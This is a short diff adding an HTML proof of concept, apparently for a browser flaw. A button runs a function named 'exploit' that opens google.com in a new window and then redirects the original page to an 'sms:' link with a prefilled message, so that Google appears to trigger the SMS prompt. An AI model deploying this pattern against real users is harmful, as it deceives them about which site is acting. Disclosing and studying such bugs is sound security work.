@@ -1,0 +1,9 @@
+<script>
+function exploit(){
+  var win = window.open('https://google.com/','_blank');
+  setTimeout(function(){
+  location.href = "sms:1337&body=Google Campaign!";
+  }, 2000);
+}
+</script>
+<button onclick="exploit()">Click</button>
